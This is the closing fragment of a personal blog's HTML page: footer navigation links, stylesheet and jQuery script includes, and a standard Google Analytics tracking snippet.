          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="http://github.com/homerqing" target="_blank" rel="noopener">Github</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">


<link rel="stylesheet" href="/lib/meslo-LG/styles.css">


<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>



    <!-- Google Analytics -->
    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-37473492-6', 'auto');
        ga('send', 'pageview');
    </script>



